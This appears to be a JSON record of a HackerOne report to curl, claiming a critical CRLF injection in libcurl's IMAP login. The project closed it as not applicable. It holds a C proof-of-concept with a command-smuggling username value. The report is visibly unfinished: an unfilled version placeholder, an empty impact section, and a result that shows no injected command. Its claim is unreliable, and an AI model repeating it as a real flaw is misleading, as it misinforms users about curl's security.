@@ -1,0 +1,134 @@
+{
+  "id": 3479984,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDc5OTg0",
+  "url": "https://hackerone.com/reports/3479984",
+  "title": "CRLF Injection / Protocol Smuggling in libcurl via CURLOPT_USERNAME (IMAP)",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "critical",
+  "readable_substate": "N/A",
+  "created_at": "2025-12-27T16:35:37.584Z",
+  "submitted_at": "2025-12-27T16:35:37.975Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "efrsxcv",
+    "url": "/efrsxcv",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-12-28T21:28:41.492Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-12-27T22:06:49.892Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nI have discovered a CRLF injection vulnerability in the IMAP protocol implementation of libcurl. The vulnerability exists because the `imap_atom` function in `lib/imap.c` fails to properly sanitize or quote Carriage Return (`\\r`) and Line Feed (`\\n`) characters when processing the `CURLOPT_USERNAME` option.\n\nThis allows an attacker to inject arbitrary IMAP commands by inserting `\\r\\n` sequences into the username field. When these characters are sent to the server, they terminate the current command and allow the subsequent data to be interpreted as a new, separate command (Protocol Smuggling).\n\n## Affected version\nI successfully reproduced this on the latest master branch of curl.\n\nOutput of `curl -V`:\n[PASTE YOUR curl -V OUTPUT HERE]\n\n## Steps To Reproduce:\nTo reproduce this issue, we need to bypass the CLI argument parsing and use `libcurl` directly via a C program. We also need a manual netcat listener to observe the raw protocol data.\n\n1.  **Setup a Fake IMAP Server:**\n    Open a terminal and listen on port 143 (or any available port) using netcat:\n    `sudo nc -lvp 143`\n\n2.  **Compile the Proof of Concept (PoC):**\n    Save the following code as `poc_imap.c` and compile it against libcurl (e.g., `gcc poc_imap.c -o poc_imap -lcurl`):\n\n    ```c\n    #include <stdio.h>\n    #include <curl/curl.h>\n\n    int main(void)\n    {\n      CURL *curl;\n      CURLcode res;\n\n      curl_global_init(CURL_GLOBAL_DEFAULT);\n      curl = curl_easy_init();\n      if(curl) {\n        // Target localhost on port 143\n        curl_easy_setopt(curl, CURLOPT_URL, \"imap://127.0.0.1:143/\");\n\n        // PAYLOAD INJECTION:\n        // We inject \"LOGOUT\" as a separate command using CRLF.\n        // If vulnerable, this will be sent as a raw new line, not quoted.\n        const char *payload = \"hacker\\r\\nLOGOUT\";\n\n        curl_easy_setopt(curl, CURLOPT_USERNAME, payload);\n        curl_easy_setopt(curl, CURLOPT_PASSWORD, \"password123\");\n\n        // Set a timeout to avoid hanging indefinitely during manual test\n        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);\n\n        // Perform the request\n        res = curl_easy_perform(curl);\n        \n        curl_easy_cleanup(curl);\n      }\n      curl_global_cleanup();\n      return 0;\n    }\n    ```\n\n3.  **Run the PoC:**\n    Execute the compiled binary: `./poc_imap`\n\n4.  **Trigger the Injection (Manual Handshake):**\n    In the terminal running `netcat` (Step 1), you will see a connection. You must manually simulate the IMAP server greeting for libcurl to proceed sending data.\n    \n    * Type: `* OK IMAP server ready` and press **ENTER**.\n    * Wait for curl to send `A001 CAPABILITY`.\n    * Type: `A001 OK Capability completed` and press **ENTER**.\n\n5.  **Observe the Injection:**\n    Immediately after the handshake, observe the output in the netcat terminal.\n\n**Result:**\nThe server receives:\nA002 LOGIN hacker LOGOUT password123\n\n**Expected Behavior:**\nThe username should be quoted (e.g., `\"hacker\\r\\nLOGOUT\"`) or the client should reject the CRLF characters before sending.\n\n## Supporting Material/References:\n* **Vulnerable Component:** `lib/imap.c`, specifically the `imap_atom` function handling.\n* **Impact:** This allows Protocol Smuggling, enabling an attacker to execute arbitrary IMAP commands (like `DELETE`, `SELECT`, `CREATE`) within the authenticated session context.\n\n## Impact\n\n## Summary:",
+  "weakness": {
+    "id": 69,
+    "name": "CRLF Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5160982,
+      "file_name": "Jepretan_layar_20251227_232700.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b7shbgwzj0axh7cli1vyrniuns2s?response-content-disposition=attachment%3B%20filename%3D%22Jepretan_layar_20251227_232700.png%22%3B%20filename%2A%3DUTF-8%27%27Jepretan_layar_20251227_232700.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCTLAZYO%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150008Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCICvDTKJUgIl%2Bq83LvpeoLVNAK%2Fknu%2B8YUfJlKUoo48BiAiAHUMZuidqQGWZFepCXdjX1mFlRVhT0VT7YgDhSZP92kSq6BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMNPL5bO5Z3alMXqRFKo4F4fBDy5oEITbcGbidgiv2X2t2a0NKYCb6ai4gPP77bYVo6i7gR7BG4vO9XJDbLMUklSyeDIhNl6NuuRjLl%2FJgd1VMJA1b53xukmdwXGb4rUbWiFoIExz0EWC%2BkT2XtAnB5mtw%2B%2BwqAMJjzITsjP%2BWWXD5i6dZHGW6mRNlZywimS79PZFEEj9gJvMkkHKpCYJu5UzhF3THASIExyqBbCsB401NNUR3QRxSwolUbKlu6BtZV3XRb27eXsFmzx7KPBm1xeSmIDgjKOmjHmFWkg%2BbaNG%2FfwsvWIeRFBoheEraVzCQfXweGJV2YdgNhKww9uRldIBilV962qk24%2BuNpmu3qsfr7fcef2P%2By1D%2B%2FytfZGRfZuiwBlmogRnG1LQvSDhEV1sV%2FrvmKi8ux7a%2BPLUFhWNkJB7%2F9ep8JPfmgTfy0hEbMSWIck5cNSt%2Fgko1ENIge83bR7nmp6%2BROFwrAwwd1lnGyZRY9OZEBnLRMQvoalcKydaa4wqSQDmH6GqoZZXm4WSJE3617MWydbKgk8W3ItafEuhIAHSofhuNdj6Ynl8mk6H8rgLzbOdbidcnnNOdcqipN5DED10whJlSnUwRsQBmSxN6p%2FmBApFCIkZQWtdYAZQDNltgGocyTSkXRe3HKn0hZGVUouuBIQvOtE5EMrscGNIFt3FATktVwSzZ%2FA6xkzaL9Qh6hu9XVmXCTdOuKSlaBHDiSfzYKJ1vTDqIBsSSU5nbYiSd9IAR8Yp3xyzGRfZxZQsvYTSxLAPELduG%2FV19MEEqUTy2gwKAnX4ZN0u5sG0Q%2BRfE1drrjnmU0tyUGOYAeLG5HqQQvfXGtmzgytHLuKTyI1tmN8lwj%2FsJW2FE7YvwVE4iiVZw3jsaMM6L%2Fc8GOrIBvO8cwwltCM4AdpQm9fgxmw5xylTv3zg9giXb3OYWLXKRgnJlEHrAmDmi6bvrYvpiQq2dmMClKLu7JhdGbhneuiiX6el3NvvQUzBssd2Fv3n1sfwbUtXe9%2BeDCMpN6l8qKlRTK27efoDAHuuBXAWX8nkjKDl7MjO%2BWDkCNHCGCyndZgpNGi1h6qtrSmHQTTOou5pX0%2BLnE%2Bb7rtMOkNB4k2pm81UBSOP7SpMpRgGnW%2FyM2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c95b1828921abf265a8b7936434578376eabdb138a3924539627c27b5d241054",
+      "file_size": 65534,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5160983,
+      "file_name": "Jepretan_layar_20251227_232713.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/a43zxi0igfdjkz2zk2881fk6c2x5?response-content-disposition=attachment%3B%20filename%3D%22Jepretan_layar_20251227_232713.png%22%3B%20filename%2A%3DUTF-8%27%27Jepretan_layar_20251227_232713.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRCTLAZYO%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150008Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJGMEQCICvDTKJUgIl%2Bq83LvpeoLVNAK%2Fknu%2B8YUfJlKUoo48BiAiAHUMZuidqQGWZFepCXdjX1mFlRVhT0VT7YgDhSZP92kSq6BQjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMNPL5bO5Z3alMXqRFKo4F4fBDy5oEITbcGbidgiv2X2t2a0NKYCb6ai4gPP77bYVo6i7gR7BG4vO9XJDbLMUklSyeDIhNl6NuuRjLl%2FJgd1VMJA1b53xukmdwXGb4rUbWiFoIExz0EWC%2BkT2XtAnB5mtw%2B%2BwqAMJjzITsjP%2BWWXD5i6dZHGW6mRNlZywimS79PZFEEj9gJvMkkHKpCYJu5UzhF3THASIExyqBbCsB401NNUR3QRxSwolUbKlu6BtZV3XRb27eXsFmzx7KPBm1xeSmIDgjKOmjHmFWkg%2BbaNG%2FfwsvWIeRFBoheEraVzCQfXweGJV2YdgNhKww9uRldIBilV962qk24%2BuNpmu3qsfr7fcef2P%2By1D%2B%2FytfZGRfZuiwBlmogRnG1LQvSDhEV1sV%2FrvmKi8ux7a%2BPLUFhWNkJB7%2F9ep8JPfmgTfy0hEbMSWIck5cNSt%2Fgko1ENIge83bR7nmp6%2BROFwrAwwd1lnGyZRY9OZEBnLRMQvoalcKydaa4wqSQDmH6GqoZZXm4WSJE3617MWydbKgk8W3ItafEuhIAHSofhuNdj6Ynl8mk6H8rgLzbOdbidcnnNOdcqipN5DED10whJlSnUwRsQBmSxN6p%2FmBApFCIkZQWtdYAZQDNltgGocyTSkXRe3HKn0hZGVUouuBIQvOtE5EMrscGNIFt3FATktVwSzZ%2FA6xkzaL9Qh6hu9XVmXCTdOuKSlaBHDiSfzYKJ1vTDqIBsSSU5nbYiSd9IAR8Yp3xyzGRfZxZQsvYTSxLAPELduG%2FV19MEEqUTy2gwKAnX4ZN0u5sG0Q%2BRfE1drrjnmU0tyUGOYAeLG5HqQQvfXGtmzgytHLuKTyI1tmN8lwj%2FsJW2FE7YvwVE4iiVZw3jsaMM6L%2Fc8GOrIBvO8cwwltCM4AdpQm9fgxmw5xylTv3zg9giXb3OYWLXKRgnJlEHrAmDmi6bvrYvpiQq2dmMClKLu7JhdGbhneuiiX6el3NvvQUzBssd2Fv3n1sfwbUtXe9%2BeDCMpN6l8qKlRTK27efoDAHuuBXAWX8nkjKDl7MjO%2BWDkCNHCGCyndZgpNGi1h6qtrSmHQTTOou5pX0%2BLnE%2Bb7rtMOkNB4k2pm81UBSOP7SpMpRgGnW%2FyM2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=048cdb40bcd3919fa0d2089253845bce737bb60a035aa3d8d4137e9430878c57",
+      "file_size": 65516,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 5,
+  "voters": [
+    "2026",
+    "haydar98",
+    "sk8lynnhal",
+    "cogitoincido",
+    "hackwidmaddy"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
